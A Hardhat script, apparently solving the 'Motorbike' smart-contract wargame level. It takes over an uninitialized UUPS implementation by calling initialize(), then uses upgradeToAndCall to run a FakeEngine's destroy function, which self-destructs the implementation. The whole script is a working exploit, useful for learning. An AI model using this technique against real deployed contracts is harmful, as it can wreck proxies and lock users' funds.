const { waffle, ethers } = require("hardhat");

const MOTORBIKE = "0xF77831bAd8a8457FBce0735d7fB7593ee62da3FD";
const slot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";


async function main() {


    let engineAddress = await waffle.provider.getStorageAt(MOTORBIKE, slot);
    engineAddress = "0x" + engineAddress.slice(26)
    console.log(engineAddress);

    let engine = await ethers.getContractAt("Engine", engineAddress);


    // Deploy fake engine with destroy function 
    const fakeEngineFactory = await ethers.getContractFactory("FakeEngine");
    const fakeEngine = await fakeEngineFactory.deploy();
    await fakeEngine.deployed();
    console.log(`FakeEngine deployed to: `, fakeEngine.address);

    // let fakeEngine = await ethers.getContractAt("FakeEngine", "0xa99b783BcE8Cb593006f3ab3E59a74Ca667E3a5f");    

    // Making us the upgrader as upgarder can call upgradeToAndCall function
    let initialzeTx = await engine.initialize();
    await initialzeTx.wait(1);

    // Getting function signatute of destroy
    let data = fakeEngine.interface.encodeFunctionData("destroy");
    console.log(data);

    // Calling upgardeToAndCall passing new engine address. 
    //It will delegate to new engine. So new engines's destroy function logic will be run in contex of original engine. 
    //Result in selfdestruct of engine
    let upgardeTx = await engine.upgradeToAndCall(fakeEngine.address, data);
    await upgardeTx.wait(1);
}

main()
.then(() => process.exit(0))
.catch((error) => {
    console.log(error);
    process.exit(1);
})